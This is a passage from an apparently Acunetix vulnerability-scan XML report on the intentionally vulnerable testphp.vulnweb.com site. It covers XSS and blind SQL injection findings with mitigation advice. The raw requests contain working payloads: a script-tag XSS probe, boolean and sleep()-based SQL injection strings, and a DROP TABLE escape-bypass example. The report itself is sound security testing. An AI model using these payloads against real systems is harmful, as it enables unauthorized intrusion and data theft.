          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="75" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark">3'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;A5Gn(9786)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?artist=3'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;A5Gn(9786)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:52 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4219
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="76" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark">-1 OR 3*2*1=6 AND 000603=000603 -- </font></b><br/><br/>Tests performed: <ul><li>-1 OR 2+603-603-1=0+0+0+1 --  =&gt; <b>TRUE</b></li><li>-1 OR 3+603-603-1=0+0+0+1 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2&lt;(0+5+603-603) --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2&gt;(0+5+603-603) --  =&gt; <b>FALSE</b></li><li>-1 OR 2+1-1-1=1 AND 000603=000603 --  =&gt; <b>TRUE</b></li><li>-1 OR 000603=000603 AND 3+1-1-1=1 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2=5 AND 000603=000603 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2=6 AND 000603=000603 --  =&gt; <b>TRUE</b></li><li>-1 OR 3*2*0=6 AND 000603=000603 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2*1=6 AND 000603=000603 --  =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?artist=-1%20OR%203*2*1=6%20AND%20000603=000603%20--%20 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:56 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 48618
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="77" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">test</font></b> was set to <b><font color="dark">(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/</font></b><br/><br/>Tests performed: <ul><li>(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/ =&gt; <b>6.329 s</b></li><li>(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'&quot;+(select(0)from(select(sleep(9)))v)+&quot;*/ =&gt; <b>9.328 s</b></li><li>(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <b>0.313 s</b></li><li>(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'&quot;+(select(0)from(select(sleep(3)))v)+&quot;*/ =&gt; <b>3.329 s</b></li><li>(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <b>0.313 s</b></li><li>(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <b>0.313 s</b></li><li>(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <b>0.313 s</b></li><li>(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/ =&gt; <b>6.328 s</b></li><li>(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <b>0.328 s</b></li></ul><br/> Original value: <b>query</b>]]></Details>
       <Affects><![CDATA[/search.php]]></Affects>
       <Parameter><![CDATA[test]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
